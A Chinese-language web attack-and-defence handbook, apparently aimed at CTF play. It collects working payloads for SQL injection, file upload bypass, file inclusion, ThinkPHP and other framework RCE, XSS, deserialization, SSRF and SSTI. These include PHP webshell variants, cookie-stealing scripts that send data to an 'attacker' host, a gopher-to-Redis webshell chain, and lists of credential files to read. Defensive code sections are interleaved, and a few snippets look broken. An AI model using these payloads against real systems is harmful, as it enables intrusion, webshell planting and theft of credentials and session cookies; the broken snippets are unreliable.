# Web 攻防深度手册

## 1. SQL 注入

### 1.1 完整利用链（Step-by-Step）

**Step 1: 判断注入点**
```
and 1=1 -- -   vs  and 1=2 -- -   （布尔注入，看响应长度/状态变化）
and sleep(5) -- -                  （时间盲注，看响应时间）
' order by 1-- -  →  ' order by 10-- -  → 报错（判断列数）
```

**Step 2: 判断列数 + 找显示位**
```
-1 union select 1,2,3,4,5-- -     （用报错确定列数）
# 逐个注释掉数字看哪个在页面显示
# 显示位 = 响应中出现的数字
```

**Step 3: 枚举信息**
```
# 版本/数据库/用户
-1 union select @@version,database(),user()-- -

# 表名枚举
-1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- -

# 列名枚举
-1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users'-- -

# 数据读取
-1 union select 1,group_concat(id,0x3a,username,0x3a,password),3,4,5 from users-- -

# 读文件（需 FILE 权限）
-1 union select 1,load_file('/flag'),3,4,5-- -
-1 union select 1,load_file('/etc/passwd'),3,4,5-- -

# 写文件（需 FILE+可写权限）
-1 union select '<?php @eval($_POST[c]);?>',2,3,4,5 into outfile '/app/upload/s.php'-- -
-1 union select '<?php @eval($_POST[c]);?>',2,3,4,5 into dumpfile '/app/upload/s.php'-- -
```

### 1.2 注入手法完整列表

| 类型 | Payload | 适用场景 |
|------|---------|----------|
| Union 注入 | `-1 union select 1,username,password from users--+` | 有显示位 |
| 报错注入(updatexml) | `and updatexml(1,concat(0x7e,version()),1)` | 无显示位，报错回显 |
| 报错注入(extractvalue) | `and extractvalue(1,concat(0x7e,database()))` | 同上 |
| 报错注入(floor) | `(select 1 from (select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)` | 同上 |
| 布尔盲注 | `and (substr(database(),1,1))='a'` → 逐位爆破 | 无回显，可判断真假 |
| 时间盲注 | `and if(substr(database(),1,1)='a',sleep(5),0)` → 逐位爆破 | 完全无回显 |
| 堆叠注入 | `1;drop table users;--` | 可执行多条语句 |
| 宽字节绕过 | `%df%27` (GBK) | addslashes 转义绕过 |
| 二次注入 | 首次写入，第二次触发 | 存储型 |
| Cookie 注入 | Cookie: id=1 and 1=1 | HTTP 头注入点 |
| User-Agent 注入 | User-Agent: 1' and 1=1-- | HTTP 头注入 |
| Referer 注入 | Referer: 1' and 1=1-- | HTTP 头注入 |
| 一阶注入 | 直接注入获取数据 | 最基础 |
| 过滤空格 | `select/**/1,2/*,*/from/**/users` | WAF 过滤空格 |
| 注释绕过 | `/*!50000union*/ /*select*/ 1,2` | MySQL 版本注释 |
| 大小写绕过 | `UNion SeLeCt 1,2` | 大小写不敏感 |
| 编码绕过 | `%75nion %73elect 1,2` | URL 编码 |
| 重复关键字 | `UNION UNION SELECT 1,2` | 过滤器只替换一次 |
| 延时替代 | `benchmark(10000000,sha1('test'))` | 绕过 sleep 禁用 |
| DNS 外带 | `load_file(concat('\\\\',database(),'.attacker.com\\flag'))` | 无回显但可 DNS |

### 1.3 常用 SQL 函数字典

```sql
-- 版本信息
@@version(), @@datadir, @@basedir, @@hostname, @@version_compile_os
database(), schema(), user(), current_user(), system_user()

-- 字符串处理
concat('a','b','c')        → abc
group_concat(col separator ',') → 多行合并
substr('abc',1,2)          → ab
mid('abc',1,2)             → ab
left('abc',2)              → ab
right('abc',2)             → bc
length('abc')              → 3
char(65,66,67)             → ABC
ord('A')                   → 65
hex('abc')                 → 616263
unhex('616263')            → abc
0x616263                   → abc (十六进制)

-- 文件操作
load_file('/flag')
into outfile '/path/file'
into dumpfile '/path/file'

-- 条件
if(cond, true_val, false_val)
ifnull(val, null_val)

-- 时间
sleep(N)
benchmark(N, expr)
```

### 1.4 盲注脚本模板

```python
import requests
import time

def blind_injection(url, payload_template, position=1):
    """布尔盲注：逐位爆破"""
    result = ""
    for pos in range(1, 100):
        found = False
        for c in range(32, 127):  # ASCII 可打印字符
            payload = payload_template.format(
                pos=pos, char=chr(c), hex_char=hex(c)
            )
            try:
                r = requests.get(url + payload, timeout=5)
                # 布尔注入：响应长度/状态码变化
                if len(r.text) != baseline_length:
                    result += chr(c)
                    print(f"  [+] Position {pos}: {chr(c)} → {result}")
                    found = True
                    break
            except:
                pass
        if not found:
            break
    return result

# 使用示例
url = "http://target/index.php?id=1"
# 布尔盲注
baseline = len(requests.get(url + " and 1=1-- -").text)
# 时间盲注
start = time.time()
requests.get(url + " and if(1=1,sleep(3),0)-- -")
elapsed = time.time() - start
```

### 1.5 SQL 注入防御代码

**PHP 防御：**
```php
<?php
// 方法1: PDO 预编译（首选）
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$_GET['id']]);
$user = $stmt->fetch();

// 方法2: mysqli 预编译
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
$stmt->bind_param('s', $id);
$stmt->execute();

// 方法3: 输入验证
$id = intval($_GET['id']);  // 强制整数
$name = preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['name']);  // 白名单过滤

// 方法4: ORM
$user = User::where('id', $_GET['id'])->first();
?>
```

**Java 防御：**
```java
// 预编译
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, Integer.parseInt(request.getParameter("id")));
ResultSet rs = ps.executeQuery();

// MyBatis
@Select("SELECT * FROM users WHERE id = #{id}")
User selectById(@Param("id") Integer id);
// #{} 自动参数化，${} 则是字符串拼接（危险！）
```

**Python 防御：**
```python
# sqlite3
conn.execute('SELECT * FROM users WHERE id = ?', (user_id,))

# SQLAlchemy
session.query(User).filter(User.id == user_id).first()

# Django
User.objects.filter(id=user_id).first()
```

---

## 2. 文件上传漏洞

### 2.1 完整利用链

```
Step 1: 侦察上传入口
  ├── URL: index.php?m=Home&c=Upload&a=index
  ├── 字段名: file, Filedata, upfile, upload, avatar, pic, img, image, photo, attach
  ├── MIME 类型: image/jpeg, image/png, image/gif, application/octet-stream
  └── POST 参数: save_path, path, filepath, dir, savepath

Step 2: 扩展名绕过（按优先级试）
  ├── 黑名单漏网扩展: php5, php4, phtml, pht, phps, phar
  ├── 大小写: PHP, Php, pHp
  ├── 双写: php.jpg, phtml.jpg（过滤器只替换一次）
  ├── 点号/空格: php., php.. , php 
  ├── 空字节: php%00.jpg (PHP<5.3.4)
  ├── ::$DATA (Windows): test.php::$DATA
  └── 特殊: 0x00截断

Step 3: 配置文件绕过
  ├── .htaccess (Apache):
  │   AddType application/x-httpd-php .abc .xyz
  │   AddHandler application/x-httpd-php .abc
  │   <FilesMatch "\.jpg$">SetHandler application/x-httpd-php</FilesMatch>
  ├── .user.ini (CGI/FastCGI):
  │   auto_prepend_file="shell.jpg"
  │   auto_append_file="shell.jpg"
  └── 配合: 上传 .htaccess/.user.ini + 上传 shell.abc/shell.jpg(PHP内容)

Step 4: 路径遍历上传
  ├── 文件名含 "../": ../../Runtime/Cache/shell.php
  ├── POST 参数指定: save_path=../../Public/test.php
  └── 目标目录: Runtime/Cache, Runtime/Logs, Public, Data, Uploads

Step 5: 竞争条件
  ├── 并发上传 + 并发访问
  ├── 在 move_uploaded_file 前访问临时文件
  └── PHPSESSION_UPLOAD_PROGRESS race

Step 6: 图片马 + 解析绕过
  ├── GIF89a + PHP 代码（头部 + shell）
  ├── 配合 Apache 多扩展名解析（shell.php.jpg 被当 PHP）
  └── 配合 .htaccess 让 .jpg 当 PHP 执行

Step 7: 利用成功后
  ├── 写更多后门（不同路径、不同形态）
  ├── 读取 /flag
  ├── 维持访问（修改 index.php 植入后门）
  └── 清理痕迹
```

### 2.2 WAF 绕过对照表

| 绕过技巧 | Payload 示例 | 检测规则 | 绕过方法 |
|----------|-------------|----------|----------|
| 黑名单扩展名 | shell.phtml | 拦截.php | PHP 变种未覆盖 |
| 大小写混合 | shell.PHP | 小写php | 大小写不敏感系统 |
| 双写 | shell.php.jpg | 替换.php→空 | 过滤器只替换一次 |
| 空字节截断 | shell.php%00.jpg | 完全匹配.php | PHP<5.3.4 |
| 末尾点号 | shell.php. | 严格后缀匹配 | Windows 去尾点 |
| 末尾空格 | shell.php  | 严格后缀匹配 | Windows 去尾空格 |
| MIME 篡改 | 修改 Content-Type | 仅检查 MIME | 绕过服务端内容检查 |
| .htaccess | AddType 配置 | 禁用上传配置文件 | Apache 配置注入 |
| .user.ini | auto_prepend_file | 禁用上传 ini | CGI/FastCGI 环境 |
| 图片马+解析 | GIF89a+PHP | 检查文件头 | 服务器解析漏洞 |
| 路径遍历 | ../uploads/shell.php | 固定上传路径 | 绕过目录限制 |
| 竞争条件 | 并发上传+访问 | 同步锁 | 在删除前执行 |
| phar:// | phar://shell.phar | 常规上传检查 | PHP 流包装器 |
| .htpasswd | 上传密码文件 | 禁用敏感文件 | Apache 认证配置 |

### 2.3 Webshell 变形清单

```php
<?php
// 1. 基础
@eval($_POST['cmd']);

// 2. 拆分关键字
$k = 'e' . 'val';
$k($_POST['cmd']);

// 3. 可变变量
$a = 'cmd';
$$a($_POST[$a]);

// 4. 数组回调
call_user_func($_POST['func'], $_POST['arg']);

// 5. 反序列化
unserialize($_POST['d']);
// 配合 __wakeup / __destruct 魔术方法

// 6. preg_replace /e
preg_replace('/./e', $_POST['cmd'], '');

// 7. assert（老版本）
assert($_POST['cmd']);

// 8. base64 编码
eval(base64_decode('ZWN2YWwoJF9QT1NUWydjbWQnXSk7'));

// 9. gzinflate
eval(gzinflate(base64_decode('...')));

// 10. 异或加密
eval($_POST['c'] ^ 0x11);

// 11. 无数字无字母（利用 PHP 特性）
<?php
$_GET['a']($_GET['b']);
// 调用: ?a=system&b=id

// 12. 图片马（GIF 头）
GIF89a<?php @eval($_POST['cmd']);?>

// 13. 一句话 + 密码
<?php $_GET['a']($_POST['b']); ?>
// URL: ?a=system
// POST: b=id

// 14. 无函数名
<?php
$p = '';
for ($i=0; $i<5; $i++) $p .= chr(ord('e')+$i==3?$i:0);  // eval
// 过于复杂，仅作参考

// 15. 动态调用
<?php $f='assert'; $f($_POST['c']);?>
```

### 2.4 文件上传防御代码

**PHP 防御：**
```php
<?php
// 1. 白名单扩展名
$allowed = ['jpg', 'jpeg', 'gif', 'png', 'bmp', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'zip', 'rar', 'mp3', 'mp4'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) { die('Invalid extension'); }

// 2. 重命名文件（不保留原始名）
$new_name = md5(uniqid(mt_rand(), true)) . '.' . $ext;
$upload_path = '/app/uploads/' . $new_name;

// 3. 图片类型检测
$image_info = @getimagesize($_FILES['file']['tmp_name']);
if ($image_info === false && in_array($ext, ['jpg', 'png', 'gif', 'bmp'])) {
    die('Invalid image');
}

// 4. MIME 类型验证
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf', 'text/plain'];
if (!in_array($mime, $allowed_mimes)) { die('Invalid MIME'); }

// 5. 禁止 .htaccess / .user.ini
if (in_array($ext, ['htaccess', 'user', 'ini', 'phps']) || strpos($ext, 'php') !== false) {
    die('Forbidden');
}

// 6. 禁用上传目录 PHP 执行
// Apache: php_flag engine off
// Nginx: location /uploads { location ~ \.php$ { deny all; } }
?>
```

---

## 3. 文件包含漏洞

### 3.1 完整利用链

```
Step 1: 找到包含点
  ├── 页面URL参数: ?file=, ?page=, ?path=, ?template=, ?tpl=, ?skin=
  ├── 常见功能: 文章查看、模板渲染、语言切换、主题切换
  └── 识别: URL 参数控制文件路径 → include/require/include_once/require_once

Step 2: 判断包含类型
  ├── 本地包含 (LFI): 路径可控，包含本地文件
  ├── 远程包含 (RFI): 可包含远程文件 → allow_url_include=On
  └── 伪协议: php://, data://, phar://, zip://, file://

Step 3: 构造 Payload
  ├── 敏感文件读取: ../../etc/passwd, ../../proc/self/environ
  ├── 伪协议读取源码: php://filter/read=convert.base64-encode/resource=index.php
  ├── Session 包含: /tmp/sess_xxx（需先写入 Session）
  ├── 日志包含: 先写日志 → 包含日志路径
  ├── 缓存包含: 包含 Runtime/Cache/ 下文件
  ├── 临时文件包含: 上传未完成文件 → 包含 /tmp/php_xxx
  ├── phar:// 包含: 上传 phar 文件 → 用 phar:// 包含
  └── data:// 包含: data://text/plain;base64,PD9waHAg...

Step 4: 访问目标
  ├── 直接访问: index.php?file=../../etc/passwd
  ├── 深度遍历: ../../../etc/passwd（多层 ../）
  └── URL 编码: %2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 3.2 LFI 常用文件字典

```
# Linux
/etc/passwd              # 用户列表
/etc/shadow              # 密码哈希（权限）
/etc/hosts               # 主机信息
/etc/my.cnf              # MySQL 配置
/etc/apache2/apache2.conf  # Apache 配置
/etc/nginx/nginx.conf    # Nginx 配置
/proc/self/environ       # 环境变量（含数据库密码等）
/proc/self/cmdline       # 启动命令
/proc/self/fd/0          # stdin
/proc/self/status        # 进程状态
/var/log/apache/access.log  # Apache 访问日志
/var/log/apache/error.log   # Apache 错误日志
/var/log/nginx/access.log   # Nginx 访问日志
/var/log/nginx/error.log    # Nginx 错误日志
/var/log/auth.log        # 认证日志
/var/log/syslog          # 系统日志
/tmp/sess_xxx            # Session 文件
/var/lib/php5/sess_xxx   # Session 文件
/var/lib/php/session/sess_xxx
/root/.ssh/id_rsa         # SSH 私钥
/root/.bash_history       # 命令历史
/root/.bashrc             # bash 配置
/home/*/.bash_history     # 用户历史
/app/config.php          # 应用配置
/app/db.php              # 数据库配置

# Windows
C:\windows\system32\config\sam  # SAM 数据库
C:\windows\win.ini         # Windows 配置
C:\windows\system.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\apache\logs\access.log
C:\windows\nginx\logs\access.log
C:\inetpub\logs\LogFiles\
```

### 3.3 文件包含防御代码

```php
<?php
// 1. 禁用危险配置
// php.ini: allow_url_include=Off, allow_url_fopen=Off
// php.ini: open_basedir=/var/www/html:/tmp
// php.ini: disable_functions=include,require,file_get_contents,fopen

// 2. 路径过滤
$file = $_GET['file'];
// 去除 ../ 和 ..\
$file = str_replace(['../', '..\\', '%2e%2e%2f', '%2e%2e/'], '', $file);

// 3. 白名单包含
$allowed_templates = ['home', 'about', 'contact', '404'];
if (!in_array($file, $allowed_templates)) {
    die('Invalid template');
}
include "/app/templates/{$file}.php";

// 4. 路径规范化
$real_path = realpath($file);
$allowed_dir = '/app/templates/';
if (strpos($real_path, $allowed_dir) !== 0) {
    die('Path traversal detected');
}

// 5. 禁用 PHP 伪协议
// php.ini: allow_url_include=Off
// 代码中检查协议
if (preg_match('/^(php|data|phar|zip|gopher|dict|file):\/\//i', $file)) {
    die('Protocol not allowed');
}
?>
```

---

## 4. 远程代码执行 (RCE)

### 4.1 ThinkPHP 3.2.3 RCE 完整利用链

```
# 原始 payload（name 参数注入）
GET /index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}

# 多参数位爆破（name 被修复时）
GET /index.php?s=/Index/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Index/index/page/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Index/index/cat/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Index/index/aid/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Index/index/nid/${@print(file_get_contents('/flag'))}

# 多控制器
GET /index.php?s=/Show/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Article/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/News/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Page/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/List/index/id/${@print(file_get_contents('/flag'))}
GET /index.php?s=/Product/index/id/${@print(file_get_contents('/flag'))}

# 不同路由模式
GET /index.php?m=Home&c=Index&a=index&name=${@print(file_get_contents('/flag'))}
GET /index.php/Home/Index/index/name/${@print(file_get_contents('/flag'))}
GET /index.php/index/name/${@print(file_get_contents('/flag'))}

# POST 方式
POST /index.php
Content-Type: application/x-www-form-urlencoded

m=Home&c=Index&a=index&name=${@print(file_get_contents('/flag'))}

# 探测 payload（无副作用）
${@print(md5(1234))}   → 返回: 81dc9bdb52d04dc20036dbd8313ed055
${@phpinfo()}           → 返回 PHP 信息页面
${@system('id')}        → 返回当前用户
${@system('whoami')}    → 返回用户名
${@readfile('/flag')}   → 直接输出 flag 文件内容
${@echo file_get_contents('/flag')} → 读取 flag
${@print(file_get_contents('../../../flag'))} → 路径遍历读 flag
${@print(file_get_contents('/var/www/html/flag'))} → 绝对路径

# 写文件 Webshell
${@file_put_contents('/app/upload/s.php','<?php @eval($_POST[c]);?>')}

# 执行命令
${@system('cat /flag')}
${@passthru('id')}
${@shell_exec('ls -la /')}
${@exec('cat /flag')}
${@popen('cat /flag','r')}
${@proc_open('cat /flag', ...)}
```

### 4.2 ThinkPHP 5.x RCE Payload

```php
# 5.0.x / 5.1.x 公共 RCE
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag

?s=index/think\request/input?data[]=system&data[]=id

# 5.0.x 路由 RCE
?s=index/think\app/invokefunction&function=call_user_func&vars[]=system&vars[]=id

# 写入 Webshell
?s=index/think\view\driver\Php/display&content=<?php phpinfo();?>

?s=index/think\template\driver\file/write&cacheFile=shell.php&content=<?php @eval($_POST[c]);?>

# 任意文件包含
?s=index/think\request/input?filter[]=system&filter[]=id&data[]=1
```

### 4.3 其他框架 RCE

```
# Laravel (Debug 模式)
POST /_ignition/execute-solution
{"solution":"Facade\\Illuminate\\Foundation\\Solutions\\ExecuteSolution","parameters":{"command":"system('id')"}}

# CodeIgniter 3.x
POST /index.php?c=main&m=index&d=default
<?php phpinfo();?>

# WordPress (插件漏洞)
POST /wp-content/plugins/some-plugin/exploit.php
cmd=system('id')

# vBulletin
POST /ajax/render/widget_php
widgetConfig[code]=echo system('id');
```

### 4.4 Webshell 管理工具

```bash
# Weevely 生成加密 Webshell
weevely generate password shell.php

# AntSword（蚁剑）连接
# URL: http://target/upload/s.php
# 密码: c (或自定义)
```

### 4.5 RCE 防御代码

**PHP (WAF 规则)：**
```php
<?php
// waf.php - 核心检测逻辑
function waf_check($input) {
    $patterns = [
        // RCE 特征
        '/\$\{@/i',                          // ThinkPHP RCE
        '/eval\s*\(/i',                       // eval
        '/assert\s*\(/i',                     // assert
        '/system\s*\(/i',                     // system
        '/exec\s*\(/i',                       // exec
        '/passthru\s*\(/i',                   // passthru
        '/shell_exec\s*\(/i',                 // shell_exec
        '/popen\s*\(/i',                      // popen
        '/proc_open\s*\(/i',                  // proc_open
        '/pcntl_exec\s*\(/i',                 // pcntl_exec
        '/preg_replace.*\/e/i',               // preg_replace /e
        '/call_user_func\s*\(/i',             // call_user_func
        '/include\s*\(/i',                    // include
        '/require\s*\(/i',                   // require
        '/base64_decode\s*\(/i',              // base64_decode
        '/gzinflate\s*\(/i',                 // gzinflate
        // SQL 注入
        '/union\s+select/i',
        '/select.*from/i',
        '/drop\s+table/i',
        '/insert\s+into/i',
        // XSS
        '/<script[^>]*>/i',
        '/javascript\s*:/i',
        '/onerror\s*=/i',
        '/onload\s*=/i',
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $input)) {
            return false;  // 拦截
        }
    }
    return true;  // 放行
}

// 检查所有输入
$inputs = array_merge($_GET, $_POST, $_REQUEST, $_COOKIE);
foreach ($inputs as $key => $value) {
    if (is_string($value) && !waf_check($value)) {
        // 记录日志 + 拦截
        file_put_contents('/tmp/waf_block.log', date('Y-m-d H:i:s')." BLOCKED: $key=$value\n", FILE_APPEND);
        die('403 Forbidden - WAF Blocked');
    }
}
?>
```

**php.ini 安全配置：**
```ini
disable_functions = eval,assert,system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec,backtick,call_user_func,call_user_func_array,include,require,file_get_contents,fopen,file_put_contents,unserialize
open_basedir = /var/www/html:/tmp
allow_url_include = Off
allow_url_fopen = Off
display_errors = Off
expose_php = Off
```

---

## 5. 跨站脚本 (XSS)

### 5.1 XSS Payload 完整列表

```javascript
// 基础
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>fetch('http://attacker/?c='+document.cookie)</script>

// 无 script 标签
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<div onmouseover=alert(1)>hover me</div>

// 编码绕过
<img src=x onerror="alert(String.fromCharCode(49))">  // 49 = '1'
<img src=x onerror="alert(document['cookie'])">       // 方括号访问
<img src=x onerror="alert(atob('WFhT'))">            // base64: XSS
<img src=x onerror="alert(decodeURIComponent('XSS'))">

// HTML 实体
&#60;script&#62;alert(1)&#60;/script&#62;
<scri&#112;t>alert(1)</script>  // p=112

// 过滤绕过（双写）
<<script>alert(1)<script>/script>
<img/src=x onerror=alert(1)>  // 过滤斜杠

// Cookie 窃取
<script>fetch('http://attacker/steal?c='+document.cookie)</script>
<script>new Image().src='http://attacker/steal?c='+document.cookie</script>

// XSS 打管理员（存储型，等待管理员访问）
<script>
fetch('http://attacker/steal', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie, url: location.href}),
    headers: {'Content-Type': 'application/json'}
});
</script>

// DOM Clobbering
<form id="fetch"><input name="send"></form>
<script>fetch('/admin').send(document.cookie)</script>

// XSS → CSRF 组合（用 XSS 触发管理员修改密码）
<script>
fetch('/profile', {
    method: 'POST',
    body: 'new_password=hacked123&csrf=' + document.cookie.match(/csrf=([^;]+)/)[1]
});
</script>
```

### 5.2 XSS 防御代码

```php
<?php
// 输出编码
function e($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

// 使用
echo e($_GET['name']);  // 自动转义

// Content-Security-Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");

// Cookie HttpOnly + Secure + SameSite
setcookie('session', $token, time()+3600, '/', '', true, true);
// 最后一个 true = HttpOnly

// 输入验证
$name = preg_replace('/[^a-zA-Z0-9_\x{4e00}-\x{9fa5}]/u', '', $_GET['name']);
?>
```

---

## 6. 反序列化漏洞

### 6.1 PHP 反序列化链

```php
<?php
// POP 链示例：文件包含
class FileInclude {
    private $file;
    public function __wakeup() {
        include($this->file);  // 魔术方法触发文件包含
    }
    public function setFile($f) { $this->file = $f; }
}

// 构造恶意序列化
$obj = new FileInclude();
$obj->setFile('/flag');
$payload = serialize($obj);
// 替换 file 字段为 ../../etc/passwd

// 其他常见魔术方法
__wakeup()    // unserialize 时触发
__destruct()  // 对象销毁时触发
__toString()  // 对象被当字符串使用
__call()      // 调用不存在的方法
__get()       // 访问不存在的属性
__set()       // 设置不存在的属性
```

### 6.2 Java 反序列化

```xml
<!-- Commons-Collections 链 -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

<!-- Fastjson 漏洞 -->
<!-- autoType 漏洞: 1.2.68 前可绕过 -->
```

**利用工具：**
```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections5 "id"
java -jar ysoserial.jar CommonsCollections5 "cat /flag"

# phpggc (PHP 反序列化链生成器)
phpggc -l                   # 列出所有链
phpggc Laravel/RCE1 system id   # 生成 Laravel RCE payload

# marshal-union (Python)
python3 -m marshal_union -c "import os; os.system('id')"
```

### 6.3 反序列化防御

```php
<?php
// 1. 白名单反序列化（自定义校验）
function safe_unserialize($data) {
    $objects = unserialize($data);
    // 检查对象类名白名单
    $allowed_classes = ['User', 'Product', 'Order'];
    foreach ($objects as $obj) {
        if (!in_array(get_class($obj), $allowed_classes)) {
            throw new Exception('Unauthorized class: '.get_class($obj));
        }
    }
    return $objects;
}

// 2. 使用 JSON 替代
$data = json_decode($_POST['data'], true);  // 无对象，纯数组

// 3. 签名验证
$signed_data = $_POST['data'];
$signature = hash_hmac('sha256', $signed_data, $secret);
if ($signature !== $_POST['sig']) { die('Invalid signature'); }
$result = unserialize($signed_data);
?>

// Java 端
// 1. 自定义 Validator
ObjectInputFilter filter = filterInfo -> {
    if (filterInfo.serialClass() != null && 
        !ALLOWED_CLASSES.contains(filterInfo.serialClass().getName())) {
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.ALLOWED;
};

// 2. 使用 JSON
ObjectMapper mapper = new ObjectMapper();
MyClass obj = mapper.readValue(jsonString, MyClass.class);
```

---

## 7. SSRF

### 7.1 SSRF 利用链

```
Step 1: 找到 SSRF 点
  ├── 图像抓取: ?url=http://xxx
  ├── 远程获取: ?fetch=http://xxx
  ├── 预览功能: ?preview=http://xxx
  ├── Webhook: ?callback=http://xxx
  └── PDF生成: ?url=http://xxx/content

Step 2: 探测内网
  ├── http://127.0.0.1:8080/admin  → 后台管理
  ├── http://127.0.0.1:6379       → Redis
  ├── http://127.0.0.1:3306       → MySQL
  ├── http://127.0.0.1:27017      → MongoDB
  ├── http://127.0.0.1:9000       → PHP-FPM
  ├── http://127.0.0.1:9090       → Actuator
  └── http://192.168.1.1          → 网关

Step 3: 协议利用
  ├── file:///etc/passwd          → 读本地文件
  ├── gopher://127.0.0.1:6379/_INFO  → Redis INFO
  ├── gopher://127.0.0.1:6379/_CONFIG%20GET%20dir  → Redis 配置
  ├── gopher://127.0.0.1:6379/_SLAVEOF%20attacker%206379  → Redis 主从复制
  ├── dict://127.0.0.1:6379:6379/INFO  → Redis
  ├── ftp://user:pass@127.0.0.1/  → FTP
  └── http://0x7f000001          → 127.0.0.1 十六进制

Step 4: DNS Rebinding
  ├── 控制恶意DNS: 第一次解析返回合法IP，第二次返回127.0.0.1
  ├── 绕过IP白名单检查
  └── 构造: http://evil.attacker.com → 127.0.0.1

Step 5: Redis 未授权 → RCE
  ├── gopher://127.0.0.1:6379/_SET%20payload%20%0d%0a"\\n\\n<?php @eval($_POST[c]);?>\\n\\n"
  ├── gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/app/upload/
  ├── gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20s.php
  └── gopher://127.0.0.1:6379/_SAVE → 写入 Webshell
```

### 7.2 SSRF Payload 字典

```
# 回环地址（多种形式）
http://127.0.0.1/
http://127.1/          # = 127.0.0.1
http://0.0.0.0/
http://[::1]/          # IPv6
http://0x7f000001/     # 十六进制 = 127.0.0.1
http://2130706433/     # 十进制 = 127.0.0.1
http://0177.0.0.1/     # 八进制 = 127.0.0.1
http://127.0.0.1.www.target.com/  # DNS 解析到 127.0.0.1

# 内网网段
http://10.0.0.1/
http://172.16.0.1/ - http://172.31.255.255/
http://192.168.0.1/ - http://192.168.255.255/

# 协议
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
ftp://127.0.0.1:21/
http://127.0.0.1:6379/_  # 某些框架直接请求 body 作命令
```

### 7.3 SSRF 防御

```php
<?php
// 1. 禁止私有 IP 访问
function is_private_ip($ip) {
    $private_ranges = [
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
        '127.0.0.0/8',
        '169.254.0.0/16',
        '0.0.0.0/8',
    ];
    foreach ($private_ranges as $range) {
        // 使用 ip_in_range 或 net_CIDR_match
        if (ip_in_range($ip, $range)) return true;
    }
    return false;
}

// 2. 禁用危险协议
$scheme = parse_url($url, PHP_URL_SCHEME);
$allowed_schemes = ['http', 'https'];
if (!in_array($scheme, $allowed_schemes)) { die('Invalid scheme'); }

// 3. DNS Rebinding 防护
// 使用相同的 DNS 解析结果
$ip = gethostbyname($url_host);
// 验证 ip 与 $url_host 解析结果一致
?>
```

---

## 8. SSTI 服务端模板注入

### 8.1 SSTI Payload

```python
# Jinja2 / Twig
{{7*7}}                              → 49（确认模板注入）
{{config}}                           → 配置信息
{{config.items()}}                   → 所有配置
{{self.__class__.__mro__[1].__subclasses__()}}  → 所有子类
{{self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}} → 读文件
{{self.__class__.__mro__[1].__subclasses__()[40]('/flag').read()}}      → 读 flag
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}  → RCE

# Freemarker
<#--freemarker.template.utility.Execute?new()-->${"id"?new("freemarker.template.utility.Execute")()}
<#--freemarker.template.utility.Execute?new()-->${"cat /flag"?new("freemarker.template.utility.Execute")()}

# Velocity
#set($x="e");${x.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
#set($x="e");${x.getClass().forName("java.lang.Runtime").getRuntime().exec("cat /flag")}

# Golang (text/template)
{{.}}{{printf "%s" .}}

# ERB (Ruby)
<%= system('id') %>
<%= `cat /flag` %>

# eJS
{{7*7}}
{{require('child_process').execSync('id')}}
{{require('child_process').execSync('cat /flag')}}

# Handlebars
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}

# Nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

# Pug/Jade
- require('child_process').execSync('id')
- global.require('child_process').execSync('cat /flag')

# Dustjs
{"onerror": "\n", "\n": "\n", "\\n": "onerror=\"\n"}
```

---

## 9. 文件下载/读取漏洞

```
# 任意文件下载
?file=../../etc/passwd
?path=../../../proc/self/environ
?download=../../flag

# 任意文件读取（php://filter）
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-decode/resource=config.php

# 软链接利用
ln -s /flag /app/uploads/link.jpg
# 然后访问 link.jpg 即可读取 flag

# ZIP 包含
?file=zip://shell.zip#shell.php

# phar 包含
?file=phar://shell.phar
```

---

